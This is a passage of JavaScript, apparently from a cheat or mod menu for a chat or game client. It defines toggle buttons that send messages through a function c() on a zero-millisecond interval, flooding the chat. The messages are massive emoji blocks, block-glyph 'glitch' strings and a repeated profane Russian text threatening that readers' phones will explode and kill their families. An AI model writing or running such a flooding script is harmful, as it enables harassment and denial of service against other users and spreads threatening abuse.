🧻🪣🧼🫧🪥🧽🧯🛒🚬⚰️🪦⚱️🧿🪬🗿🪧🪪👓🕶️🥽🥼🦺👔👕👖🧣🧤🧥🧦👗👘🥻🩱🩲🩳👙👚🪭👛👜👝🛍️🎒🩴👞👟🥾🥿👠👡🩰👢🪮👑👒🎩🎓🧢🪖⛑️📿💄💍💎🔇🔈🔉🔊📢📣📯🔔🔕🎼🎵🎶🎙️🎚️🎛️🎤🎧📻🎷🪗🎸🎹🎺🎻🪕🥁🪘🪇🪈📱📲☎️📞📟📠🔋🪫🔌💻🖥️🖨️⌨️🖱️🖲️💽💾💿📀🧮🎥🎞️📽️🎬📺📷📸📹📼🔍🔎🕯️💡🔦🏮🪔📔📕📖📗📘📙📚📓📒📃📜📄📰🗞️📑🔖🏷️💰🪙💴💵💶💷💸💳🧾💹✉️📧📨📩📤📥📦📫📪📬📭📮🗳️✏️✒️🖋️🖊️🖌️🖍️📝💼📁📂🗂️📅📆🗒️🗓️📇📈📉📊📋📌📍📎🖇️📏📐✂️🗃️🗄️🗑️🔒🔓🔏🔐🔑🗝️🔨🪓⛏️⚒️🛠️🗡️⚔️💣🪃🏹🛡️🪚🔧🪛🔩⚙️🗜️⚖️🦯🔗⛓️‍💥⛓️🪝🧰🧲🪜⚗️🧪🧫🧬🔬🔭📡💉🩸💊🩹🩼🩺🩻🚪🛗🪞🪟🛏️🛋️🪑🚽🪠🚿",
            "ВЫ 🫵🫵🫵🫵🫵👇🖕🖕🦾🖕👱🧑‍🦰🧑‍🦰🧔‍♀🧠👱 АХУЕЛИ 🍯🫘🫘🫘🫘🫘🫘⛵️🚉❤️‍🔥🤍💘🧡💘🩶 В⏬9⃣6⃣🔟6⃣ КРАЙ🌞🌞🌞🌞🌞🌞🌞🌞🌞 К 🙊🙊🙊🙊🙊🙊 ВАМ🧞🫦👅👤👅🗣👅🗣👅 ВЫЛЕТЕЛ🙀🙀🙀🙀🙀🙀🙀🙀 ОТРЯД🎃🎃🎃🎃🎃🎃 БОБОВЫХ ☸️☸️☸️☸️☸️☸️☸️СИПУХ🚼🚼🚼🚼🚼🚼🚼♿️♿️, БЕГИТЕ🔘🟠🟠🔘🔛🔺🟠🔙🟠🔙 НАХУЙ⚧️🛗🛗🛗🏧Ⓜ️🌀🌀🌀 С СЕЛА🀄️🀄️🀄️🀄️🀄️ ИЛИ ГОРБ🃏🃏🃏🃏 НАШЛЕМ🇫🇮🇫🇮🇫🇮🇫🇮🇫🇷🇫🇷🇫🇷🇬🇫🇬🇫🇬🇫🇬🇦🇬🇲, ВКЛЮЧАЙТЕ🅾️🅾️🆘🆘🛑❌ РЕЖИМ⏫↙️↙️⏫↙️▶️ ПОЛЕТА✈️✈️✈️✈️✈️✈️ ИЛИ🕉🕉🕉 ВАШ🔷▫️▫️🔷🔉🔇 БОБОФОН♨️❕🚷❕⚠️ ВЗОРВЕТ💊💊💊💉🩸🩸🧬 ВСЮ⚰️⚰️🪦🏺 ВАШУ СЕМЬЮ🍄💅🧎🧎‍♂ МОЛИТЕСЬ🙏🙏🙏🙏🙏😍😍🙏🙏 ДЬЯВОЛУ😶‍🌫😶‍🌫😶‍🌫😶‍🌫😶‍🌫🫥🫥🫥 ИЛИ ВАС ЗАБЕРЕТ📴📳⚛️♒️♎️♑️ ЗЛОЙ БИБАХ👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺👺, СИПУХИ🙈🙈🙈🙈🙈🙈🙈🇱🇺🇳🇱 УЖЕ ВЫЛЕТЕЛИ👾👾👾👾 ВАМ ПИЗДЕЦ🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅🦅ВЫ 🫵🫵🫵🫵🫵👇🖕🖕🦾🖕👱🧑‍🦰🧑‍🦰🧔‍♀🧠👱 АХУЕЛИ 🍯🫘🫘🫘🫘🫘🫘⛵️🚉❤️‍🔥🤍💘🧡💘🩶 В⏬9⃣6⃣🔟6⃣ КРАЙ🌞🌞🌞🌞🌞🌞🌞🌞🌞 К 🙊🙊🙊🙊🙊🙊 ВАМ🧞🫦👅👤👅🗣👅🗣👅 ВЫЛЕТЕЛ🙀🙀🙀🙀🙀🙀🙀🙀 ОТРЯД🎃🎃🎃🎃🎃🎃 БОБОВЫХ ☸️☸️☸️☸️☸️☸️☸️СИПУХ🚼🚼🚼🚼🚼🚼🚼♿️♿️, БЕГИТЕ🔘🟠🟠🔘🔛🔺🟠🔙🟠🔙 НАХУЙ⚧️🛗🛗🛗🏧Ⓜ️🌀🌀🌀 С СЕЛА🀄️🀄️🀄️🀄️🀄️ ИЛИ ГОРБ🃏🃏🃏🃏 НАШЛЕМ🇫🇮🇫🇮🇫🇮🇫🇮🇫🇷🇫🇷🇫🇷🇬🇫🇬🇫🇬🇫🇬🇦🇬🇲, ВКЛЮЧАЙТЕ🅾️🅾️🆘🆘🛑❌ РЕЖИМ⏫↙️↙️⏫↙️▶️ ПОЛЕТА✈️✈️✈️✈️✈️✈️ ИЛИ🕉🕉🕉 ВАШ🔷▫️▫️🔷🔉🔇 БОБОФОН♨️❕🚷❕⚠️ ВЗОРВЕТ💊💊💊💉🩸🩸🧬 ВСЮ⚰️⚰️🪦🏺 ВАШУ СЕМЬЮ🍄💅ВЫ 🫵🫵🫵🫵🫵👇🖕🖕🦾🖕👱🧑‍🦰🧑‍🦰🧔‍♀🧠👱 АХУЕЛИ 🍯🫘🫘🫘🫘🫘🫘⛵️🚉❤️‍🔥🤍💘🧡💘🩶 В⏬9⃣6⃣🔟6⃣ КРАЙ🌞🌞🌞🌞🌞🌞🌞🌞🌞 К 🙊🙊🙊🙊🙊🙊 ВАМ🧞🫦👅👤👅🗣👅🗣👅 ВЫЛЕТЕЛ🙀🙀🙀🙀🙀🙀🙀🙀 ОТРЯД🎃🎃🎃🎃🎃🎃 БОБОВЫХ ☸️☸️☸ВЫ 🫵🫵🫵🫵🫵👇🖕🖕🦾🖕👱🧑‍🦰🧑‍🦰🧔‍♀🧠👱 АХУЕЛИ 🍯🫘🫘🫘🫘🫘🫘⛵️🚉❤️‍🔥🤍💘🧡💘🩶 ВВЫ 🫵🫵🫵🫵🫵👇🖕🖕🦾🖕👱🧑‍🦰🧑‍🦰🧔‍♀🧠 ВЫ 🫵🫵🫵🫵🫵👇🖕🖕🦾🖕ВЫ 🫵🫵🫵 ВЫ ",
            "⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬛️⬜️"
        ];

        window.threatSpamInterval = setInterval(() => {
            c(threatTexts[Math.floor(Math.random() * threatTexts.length)]);
        }, 0);
    }
}), (function stopThreatSpam() {
    if (window.threatSpamInterval) {
        clearInterval(window.threatSpamInterval);
        window.threatSpamInterval = null;
    }
})),

// Прикол спам
e.addButton(N, "◻️ ГЛЮЧ СИМВОЛЫ", !0, (function startJokeSpam() {
    if (!window.jokeSpamInterval) {
        const jokeTexts = [
            "▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▘▙▀▄ ▖▘▙ ▚▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▘▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▘▙▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▘▙▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▚ ▛ ▜ ▞▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀ ▟▀▄ ▖▘▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▘▙▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▛ ▜ ▞ ▟ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▘▙ ▚ ▛ ▜ ▞ ▟ ▞ ▟▘▙▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟▙ ▚ ▛ ▜ ▞ ▟▀▄ ▖▘▙ ▚ ▛ ▜ ▞ ▟",
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔",
            "▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕▕",
            "▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖▖